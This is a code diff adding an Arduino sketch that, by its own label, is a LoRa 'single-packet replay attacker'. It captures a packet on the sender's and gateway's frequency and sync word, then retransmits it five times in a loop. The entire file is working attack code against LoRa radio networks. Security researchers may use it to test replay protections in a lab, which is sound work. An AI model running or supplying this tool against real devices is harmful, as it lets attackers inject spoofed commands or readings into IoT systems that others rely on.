@@ -1,0 +1,54 @@
+#include <LoRa.h>
+
+#define REPLAY_COUNT 5  // Number of times to replay each captured packet
+String capturedPacket;  // Store the single captured packet
+bool packetCaptured = false;  // Flag to indicate if we have a packet
+
+void setup() {
+    Serial.begin(9600);
+    while (!Serial);
+
+    // Initialize LoRa
+    if (!LoRa.begin(868E6)) {  // Use the same frequency as the sender and gateway
+        Serial.println("LoRa init failed!");
+        while (1);
+    }
+    LoRa.setSyncWord(0xF3);  // Use the same sync word as the sender and gateway
+    Serial.println("LoRa single-packet replay attacker ready!");
+}
+
+void loop() {
+    // Check for incoming packets if we don't have one captured yet
+    if (!packetCaptured) {
+        int packetSize = LoRa.parsePacket();
+        if (packetSize) {
+            // Read the packet
+            capturedPacket = "";
+            while (LoRa.available()) {
+                capturedPacket += (char)LoRa.read();
+            }
+            
+            packetCaptured = true;
+            Serial.println("Packet captured: " + capturedPacket);
+            Serial.println("Preparing to replay packet " + String(REPLAY_COUNT) + " times...");
+        }
+    }
+    // If we have a captured packet, replay it multiple times
+    else {
+        delay(2000);  // Initial delay before starting replay
+        
+        for (int i = 0; i < REPLAY_COUNT; i++) {
+            // Send the captured packet
+            LoRa.beginPacket();
+            LoRa.print(capturedPacket);
+            LoRa.endPacket();
+            
+            Serial.println("Replayed packet (" + String(i+1) + "/" + String(REPLAY_COUNT) + "): " + capturedPacket);
+            delay(1000);  // Delay between replayed packets
+        }
+        
+        // Reset after replaying
+        packetCaptured = false;
+        Serial.println("Replay complete. Ready to capture a new packet.");
+    }
+}
